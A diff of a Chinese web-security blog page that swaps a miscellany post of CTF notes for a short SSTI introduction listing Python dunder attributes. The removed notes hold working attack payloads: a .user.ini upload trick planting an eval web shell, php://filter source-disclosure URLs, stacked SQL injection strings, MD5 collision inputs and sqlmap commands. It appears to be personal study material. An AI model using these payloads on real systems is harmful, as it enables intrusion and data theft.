@@ -16,21 +16,23 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="HTTP本地访问 X-Real-Ip:X-Forwarded-For:Client-Ip: 代理（从哪个网站） Via: Referer(从哪个网站) User-Agent（从哪个浏览器） 反序列化—魔术方法__construct()       &#x2F;&#x2F;类的构造函数，创建对象时触发 __destruct()        &#x2F;&#x2F;类的析构函数，对象被销毁时触发 _">
+    <meta name="description" content="SSTI，即服务器端模板注入漏洞(Server-Side Template Injection)​    在渲染模板时，代码不严谨并且没有对用户的输入做严格过滤，将导致SSTI漏洞，造成任意文件读取和RCE命令执行； 注入原理: 使用 Twig 模版引擎渲染页面，其中模版含有  变量，其模版变量值来自于 GET 请求参数 $_GET[“name”]。  魔术方法12345678910__class">
 <meta property="og:type" content="article">
-<meta property="og:title" content="杂记">
-<meta property="og:url" content="https://junske51.github.io/kele6.github.io/2024/04/15/%E6%9D%82%E8%AE%B0/index.html">
+<meta property="og:title" content="SSTI（模板注入）">
+<meta property="og:url" content="https://junske51.github.io/kele6.github.io/2024/05/07/SSTI/index.html">
 <meta property="og:site_name" content="可乐">
-<meta property="og:description" content="HTTP本地访问 X-Real-Ip:X-Forwarded-For:Client-Ip: 代理（从哪个网站） Via: Referer(从哪个网站) User-Agent（从哪个浏览器） 反序列化—魔术方法__construct()       &#x2F;&#x2F;类的构造函数，创建对象时触发 __destruct()        &#x2F;&#x2F;类的析构函数，对象被销毁时触发 _">
+<meta property="og:description" content="SSTI，即服务器端模板注入漏洞(Server-Side Template Injection)​    在渲染模板时，代码不严谨并且没有对用户的输入做严格过滤，将导致SSTI漏洞，造成任意文件读取和RCE命令执行； 注入原理: 使用 Twig 模版引擎渲染页面，其中模版含有  变量，其模版变量值来自于 GET 请求参数 $_GET[“name”]。  魔术方法12345678910__class">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-04-15T15:08:58.000Z">
-<meta property="article:modified_time" content="2024-05-02T05:41:53.099Z">
+<meta property="og:image" content="c:\blog\myblog\source_posts\SSTI\0cf553389ab34885b0ed3996c07ef2ae.png">
+<meta property="article:published_time" content="2024-05-07T02:04:54.000Z">
+<meta property="article:modified_time" content="2024-05-07T03:55:19.381Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="c:\blog\myblog\source_posts\SSTI\0cf553389ab34885b0ed3996c07ef2ae.png">
   
   
   
-  <title>杂记 - 可乐</title>
+  <title>SSTI（模板注入） - 可乐</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -196,7 +198,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="杂记"></span>
+            <span id="subtitle" data-typed-text="SSTI（模板注入）"></span>
           
         </div>
 
@@ -207,8 +209,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-04-15 23:08" pubdate>
-          April 15, 2024 pm
+        <time datetime="2024-05-07 10:04" pubdate>
+          May 7, 2024 am
         </time>
       </span>
     
@@ -219,7 +221,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.6k words
+          353 words
         
       </span>
     
@@ -230,7 +232,7 @@
         
         
         
-          14 mins
+          3 mins
         
       </span>
     
@@ -267,109 +269,16 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">杂记</h1>
+            <h1 id="seo-header">SSTI（模板注入）</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><p>本地访问</p>
-<p>X-Real-Ip:<br>X-Forwarded-For:<br>Client-Ip:</p>
-<p>代理（从哪个网站）</p>
-<p>Via:</p>
-<p>Referer(从哪个网站)</p>
-<p>User-Agent（从哪个浏览器）</p>
-<h1 id="反序列化—魔术方法"><a href="#反序列化—魔术方法" class="headerlink" title="反序列化—魔术方法"></a>反序列化—魔术方法</h1><p>__construct()       &#x2F;&#x2F;类的构造函数，创建对象时触发</p>
-<p>__destruct()        &#x2F;&#x2F;类的析构函数，对象被销毁时触发</p>
-<p>__call()            &#x2F;&#x2F;调用对象不可访问、不存在的方法时触发</p>
-<p>__callStatic()     &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发</p>
-<p>__get()            &#x2F;&#x2F;调用不可访问、不存在的对象成员属性时触发</p>
-<p>__set()           &#x2F;&#x2F;在给不可访问、不存在的对象成员属性赋值时触发</p>
-<p>__isset()         &#x2F;&#x2F;当对不可访问属性调用isset()或empty()时触发</p>
-<p>__unset()         &#x2F;&#x2F;在不可访问的属性上使用unset()时触发</p>
-<p>__invoke()        &#x2F;&#x2F;把对象当初函数调用时触发</p>
-<p>__sleep()        &#x2F;&#x2F;执行serialize()时，先会调用这个方法</p>
-<p>__wakeup()       &#x2F;&#x2F;执行unserialize()时，先会调用这个方法</p>
-<p>__toString()     &#x2F;&#x2F;把对象当成字符串调用时触发</p>
-<p>__clone()        &#x2F;&#x2F;使用clone关键字拷贝完一个对象后触发</p>
-<h1 id="CRLF攻击"><a href="#CRLF攻击" class="headerlink" title="CRLF攻击"></a>CRLF攻击</h1><p>资料链接： <a target="_blank" rel="noopener" href="https://www.cnblogs.com/studyskill/p/6972576.html">https://www.cnblogs.com/studyskill/p/6972576.html</a></p>
-<p>crlf顾名思义就是其中的回车和换行，造成的漏洞是HRS漏洞</p>
-<p>在http当中http的header和body之间就是两个crlf进行分隔的</p>
-<p>HRS漏洞就是如果能控制HTTP消息头中的字符，注入一些恶意的换行，这样就能注入一些会话cookie和html代码，所以crlf injection 又叫做 HTTP response Splitting</p>
-<p>HRS漏洞可以造成 固定会话漏洞 和 无视filter的反射型xss漏洞</p>
-<p>原理 一般网站会在HTTP头中用Location: <a href="http://baidu.com这种方式来进行302跳转，所以我们能控制的内容就是Location:后面的XXX某个网址，对这个地址进行污染。">http://baidu.com这种方式来进行302跳转，所以我们能控制的内容就是Location:后面的XXX某个网址，对这个地址进行污染。</a></p>
-<p>HRS漏洞存在的前提是 ：url当中输入的字符会影响到文件，比如在重定位当中可以尝试使用%0d%0a作为crlf，</p>
-<p>利用方式：连续使用两次%0d%oa就会造成header和body之间的分离。就可以在其中插入xss代码形成反射型xss漏洞（如何做到无视filiter？）</p>
-<p>如何绕过服务端的filiter(xss漏洞)</p>
-<p>1，可以在header当中注入另外的字符集<code>&lt;meta charset=ISO-2022-KR&gt;</code></p>
-<p>使用%0f进行标记，之后的字符就不会过滤</p>
-<p>2，可以注入一个X-XSS-Protection:0就不会被拦截了</p>
-<p>使用一次%0d%0a就可以注入其http header当中的代码比如注入set-cookie信息造成会话固定漏洞</p>
-<p>防范方式：在url当中过滤%0a%0d的字符，致使其不能进行转换，或者使其不能进行污染</p>
-<h1 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h1><p>1.$a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b)———-a&#x3D;240610708&amp;b&#x3D;s878926199a——弱类型</p>
-<p>2.$ver1!&#x3D;ver2—————–ver1[]&#x3D;1&amp;ver2[]&#x3D;2</p>
-<p>3.md和md5后都是以0e开头的字符串：（数字）：240610708 &#x3D;&#x3D;&gt;md5&#x3D;&#x3D;&gt; 0e462097431906509019562988736854</p>
-<p>CbDLytmyGm2xQyaLNhWn</p>
-<p>770hQgrBOjrcqftrlaZk</p>
-<p>7r4lGXCH2Ksu2JNT3BYM</p>
-<p>QNKCDZO</p>
-<p>0e830400451993494058024219903391</p>
-<p>s878926199a</p>
-<p>0e545993274517709034328855841020</p>
-<p>s155964671a</p>
-<p>0e342768416822451524974117254469</p>
-<p>s214587387a</p>
-<p>0e848240448830537924465865611904</p>
-<p>s214587387a</p>
-<p>0e848240448830537924465865611904</p>
-<p>s878926199a</p>
-<p>0e545993274517709034328855841020</p>
-<p>s1091221200a</p>
-<p>0e940624217856561557816327384675</p>
-<p>s1885207154a</p>
-<p>0e509367213418206700842008763514</p>
-<h4 id="a-md5-a"><a href="#a-md5-a" class="headerlink" title="*$a&#x3D;&#x3D;md5($a)*"></a><em><strong>*$a&#x3D;&#x3D;md5($a)*</strong></em></h4><p>0e215962017      &#x3D;&#x3D;&gt; 0e291242476940776845150308577824</p>
-<p>0e1284838308    &#x3D;&#x3D;&gt;0e708279691820928818722257405159</p>
-<p>0e1137126905    &#x3D;&#x3D;&gt; 0e291659922323405260514745084877</p>
-<p>0e807097110     &#x3D;&#x3D;&gt;0e318093639164485566453180786895</p>
-<p>0e730083352     &#x3D;&#x3D;&gt;0e870635875304277170259950255928</p>
-<h4 id="md5-a-md5-b-a-b"><a href="#md5-a-md5-b-a-b" class="headerlink" title="*md5($a)&#x3D;&#x3D;&#x3D;md5($b) &amp; $a !&#x3D; $b*"></a><em><strong>*md5($a)&#x3D;&#x3D;&#x3D;md5($b) &amp; $a !&#x3D; $b*</strong></em></h4><p>(1)数组绕过<br><strong>a[]&#x3D;1&amp;b[]&#x3D;2</strong></p>
-<p>(2)两串不一样的字符，加密结果却相同：</p>
-<p><strong>$a&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</strong></p>
-<p><strong>&amp;</strong></p>
-<p><strong>$b&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</strong></p>
-<p>**(3)**构造特定字符串</p>
-<p>4.cookie:name&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag————–伪协议</p>
-<p>寻找index.php源代码:<a target="_blank" rel="noopener" href="http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php">http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</a></p>
-<p>若不行no back，去掉read，转换成 ?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;&#x2F;convert.iconv.a.b&#x2F;resource&#x3D;flag.php<br>抓包找漏洞</p>
-<p>5.SELECT*FROMjava.util.LinkedHashMap$EntryxWHERE(toString(x.key).contains(“app.password”))—————————mat的sql查询password</p>
-<p>6.add header&#x3D;&#x3D;&gt;   X-Forwarded-For: 127.0.0.1  &#x2F; X-Real-Id:127.0.0.1——————本地访问</p>
-<p>7.IP被限制&#x3D;&#x3D;&gt;数据包加入X-Forwarded-For: 127.0.0.1———————-加在账号密码上一行的上一行，上一行为空白，**但是账号密码上一行必须是空行（其实随便加进去都行，只要账号密码上空出来，即自己额外加一行）</p>
-<p>如：</p>
-<p>X-Forwarded-For: 127.0.0.1</p>
-<p>username&#x3D;admin&amp;&amp;pass&#x3D;6526——————-注**：管理员的账号一定是 admin</p>
-<p>8.只有[ 、 ] 、 ( 、 ) 、 ! 和 + 这六个字符组成的是 jspfuck（呼应题目），就是不想让别人认出自己的js代码，但浏览器可识别&#x3D;&#x3D;&gt;把那一串字符扔进浏览器的 chrome控制台就可</p>
-<p>\9. BASE64加密的特征：包含“&#x3D;&#x3D;” </p>
-<p>\10. str_replace 把字符串中的’key’替换为空可以使用类似这样的语句：kkeyey<br>key1可以写为  kkeyey1</p>
-<p>\11. 常见的备份文件后缀名有: .git .svn .swp .svn .~ .bak .bash_history、11.PHP反序列化漏洞：执行unserialize()时，先会调用__wakeup()。PHP反序列化漏洞：执行unserialize()时，先会调用__wakeup()。</p>
-<p>​    wakeup绕过：大于已知数，如O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}用O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}绕过 大于1即可</p>
-<p>\12. 文件漏洞上传：<br><strong>一、.user.ini</strong></p>
-<p><strong>（1）</strong>先上传.user.ini：</p>
-<p>GIF89a          </p>
-<p>auto_prepend_file&#x3D;a.jpg</p>
-<p>（改包时候一定是“.user.ini”<br>  Content-Type: image&#x2F;jpg<br>）<br>   <strong>（2）</strong> 再上传a.jpg：<br>   GIF89a</p>
-<p>​    <?=eval($_POST['cmd']);?><br>改包：“a.jgp”<br>Content-Type: image&#x2F;jpeg<br>   <strong>（3）</strong> F12查看来源：&#x2F;uploads&#x2F;index.php<br>​    <strong>(4)</strong>  用蚁剑连接 密码cmd<br>​          点”上一级“，查看更多的文件<br>**<br>**</p>
-<p>\13. convert.iconv过滤（bp爆破字典）</p>
-<p>filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF-7.UCS-4*&#x2F;resource&#x3D;flag.php</p>
-<p>\14. ?url&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>nginx服务器</p>
-<p>\15. 无授权访问：</p>
-<p> &#x2F;a.css&#x2F;..&#x2F; + 要访问的<br>如：<br>&#x2F;a.css&#x2F;..&#x2F;flag.html</p>
-<p><strong>二、SQL</strong><br>\1.  select 被过滤<br>(1)    0’;rename table <code>words</code> to words2;rename table <code>1919810931114514</code> to words;alter table words change flag id varchar(100);show tables;#<br> 然后  1‘ or 1&#x3D;1 #（也是万能密码）</p>
-<p>（2）  1’; handler <code>1919810931114514</code> open as <code>a</code>; handler <code>a</code> read next;#<br><strong>（表名  单引号要反着用）</strong><br>（3）  <strong>预编译：</strong><br>     concat 拼接：  -1’;set @sql &#x3D; CONCAT(‘se’,’lect * from <code>1919810931114514</code>;’);prepare stmt from @sql;EXECUTE stmt;#<br>或者<br>     1;set sql_mode&#x3D;pipes_as_concat;select 2</p>
-<p>2.宽字节注入：<br>?id&#x3D;1%df<br>%df%27      </p>
-<p><strong>三、sqlmap</strong>**<br>** python sqlmap.py -u  xxxxx  –dbs<br> python sqlmap.py -r post抓包文件  –dbs</p>
-<p> python sqlmap.py -u  xxxx   –data&#x3D;”username&#x3D;1” –dbs<br>数据库  -D </p>
-<p>表  -T  表名  -tables<br>列  -C  列名  -columns<br>字段 –dump<br>完整：<br> python sqlmap.py xxxxxxxxxxxxxxxxxxx  -D xx -T xx -C xx –dump</p>
-<p> 另： –batch 意思是 选项全勾</p>
+                <h2 id="SSTI，即服务器端模板注入漏洞-Server-Side-Template-Injection"><a href="#SSTI，即服务器端模板注入漏洞-Server-Side-Template-Injection" class="headerlink" title="SSTI，即服务器端模板注入漏洞(Server-Side Template Injection)"></a>SSTI，即服务器端模板注入漏洞(Server-Side Template Injection)</h2><p>​    在渲染模板时，代码不严谨并且没有对用户的输入做严格过滤，将导致SSTI漏洞，造成任意文件读取和RCE命令执行；</p>
+<p>注入原理: 使用 Twig 模版引擎渲染页面，其中模版含有  变量，其模版变量值来自于 GET 请求参数 $_GET[“name”]。</p>
+<p><img src="C:\blog\myblog\source_posts\SSTI\0cf553389ab34885b0ed3996c07ef2ae.png" srcset="/kele6.github.io/img/loading.gif" lazyload></p>
+<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">__class__	查找当前对象的当前类<br>__base__	查找当前类的父类<br>__mro__	查找当前类的所有继承类<br>__subclasses	查找父类下的所以子类<br>__init__	查看类是否重载，出现wrapper表示没有重载<br>__globals__	以字典的形式返回当前对象的全部全局变量<br>__builtins__	提供对python的所以内置标识符的直接访问<br>__getitem__    这个方法返回所给键对应的值。当对象是序列时，键是整数。当对象是映射时（字典），键是任意值。,可代替中括号，绕过中括号过滤<br>__popen__      通过创建一个管道，调用 fork 产生一个子进程，执行一个 shell 以运行命令来开启一个进程<br>os   os就是“operating system”的缩写,os模块提供的就是各种 Python 程序与操作系统进行交互的接口。通过使用os模块，一方面可以方便地与操作系统进行交互，另一方面页可以极大增强代码的可移植性<br></code></pre></td></tr></table></figure>
+
 
                 
               </div>
@@ -408,8 +317,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>杂记</div>
-      <div>https://junske51.github.io/kele6.github.io/2024/04/15/杂记/</div>
+      <div>SSTI（模板注入）</div>
+      <div>https://junske51.github.io/kele6.github.io/2024/05/07/SSTI/</div>
     </div>
     <div class="license-meta">
       
@@ -421,7 +330,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>April 15, 2024</div>
+          <div>May 7, 2024</div>
         </div>
       
       
@@ -453,9 +362,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/kele6.github.io/2024/05/07/SSTI/" title="SSTI（模板注入）">
+                      <a href="/kele6.github.io/2024/05/07/sql/" title="sql">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">SSTI（模板注入）</span>
+                        <span class="hidden-mobile">sql</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -463,8 +372,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/kele6.github.io/2024/04/15/xss/" title="xss">
-                        <span class="hidden-mobile">xss</span>
+                      <a href="/kele6.github.io/2024/04/15/%E6%9D%82%E8%AE%B0/" title="杂记">
+                        <span class="hidden-mobile">杂记</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
